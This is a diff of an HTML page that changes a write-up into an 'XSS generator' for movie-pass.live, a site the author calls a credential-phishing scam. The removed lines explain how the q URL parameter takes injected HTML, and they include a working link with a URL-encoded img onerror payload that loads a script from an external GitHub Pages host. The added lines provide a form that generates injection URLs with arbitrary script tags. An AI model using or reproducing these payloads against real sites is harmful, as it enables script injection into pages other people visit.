@@ -8,9 +8,9 @@
         * {
             background-color: rgb(54, 54, 54);
         }
-        h1,h2,h3,code,i,b,strong,em,u,a,img,div,p {
+        h1,h2,h3,i,b,strong,em,u,a,img,div,p {
             color: white;
-            font-family: 'Courier New', Courier, monospace;
+            font-family: 'Arial', Courier, monospace;
             text-align: center;
             background: none;
         }
@@ -20,32 +20,31 @@
             text-align: center;
             background: none;
         }
-        input,button {
+        input,button,textarea {
             background-color:white;
             color:black;
             text-align:center;
         }
     </style>
-    <title>movie-pxss</title>
+    <title>movie-pass.live XSS generator</title>
+    <script src="generatorTool/program.js"></script>
 </head>
 <body>
-    <h1>movie-pxss</h1>
-    <h2>UPDATE: movie-pass.live is now <del>premium4kflix.club</del> top-performance.work. However, my tool still works with literally no changes.</h2>
-    <p>Use <a href="generatorTool.html">Generator Tool</a> to generate your own URL with any html you want!</p>
+    <h1>movie-pass.live XSS generator</h1>
     <p>
-        movie-pass.live is a scam website that attempts to get an email:password from the end user. The way it does this is by targeted advertising defined by the URL.<br />
-        https://movie-pass.live/su/?s=S&cid=REFERRER-ID&q=MOVIE-TITLE&a=A&img=HEADERBANNERIMG is the structure of these URLs. If you paste that into your URL bar to visit the page, you'll actually see it leads to an advertisement for "MOVIE-TITLE".<br />
-        With the MOVIE-TITLE we can inject HTML into the page. If you try to use a script tag, however, it will detect this and remove the tag. So how can we do it anyways?
+        movie-pass.live is a scam targeted-ad website designed to get email:password. However due to the nature of the targeted advertising, we can actually inject JavaScript into the page, completely overriding it.<br />
+        This page is designed to generate URLs with custom HTML (script tags included).
     </p>
-    <p><i>an img onerror element.</i></p>
-    <p>
-        img onerror is the most well-known XSS method. Most pages do not allow this, as of how popular this method is. But movie-pass.live does not.<br />
-        Simply url encode an img onerror, and watch the magic happen!
-    </p>
-    <p>
-        I was actually able to get injected js files to work. You can see that here:<br />
-        <a href="https://movie-pass.live/su/?s=xss&cid=&q=%3Cimg+src+onerror%3D%22document.write(%27%3Cscript+src%3D\https://luphoria.github.io/XSS-externalLink.js%3E%3C%2Fscript%3E%27)%22%3E%3C%2Fimg%3E&a=3&img=" target="_blank">movie-pass.live</a>
-    </p>
-    <i> - luphoria</i>
+    <p>Because of the nature of this tool, there are many bugs. Be sure to report them to luphoria#1077.<br />
+    However, it's important to note that if your page looks like <a href="https://movie-pass.live/su/?s=xss&cid=&q=Error-inducing+input>&a=3&img=" target="_blank">this</a> it is unlikely I can fix it.<br />
+    I have tried to do so and am unable to fix a broken page if it throws the error <code>SyntaxError: `` literal not terminated before end of script</code>. Sorry about that.</p>
+
+    <center>
+        <textarea id="HTMLINPUT" placeholder="Paste html here!" rows="25" cols="90"></textarea><br /><br />
+        <button onclick='generate(document.getElementById("HTMLINPUT").value,false)'>Generate without cidHide</button><button onclick='generate(document.getElementById("HTMLINPUT").value,true)'>Generate with cidHide</button><br /><br />
+        <a id="OUTPUT" href="" target="_blank">Output</a>
+    </center>
+    <br />
+    <p><i>- luphoria#1077</i></p>
 </body>
 </html>
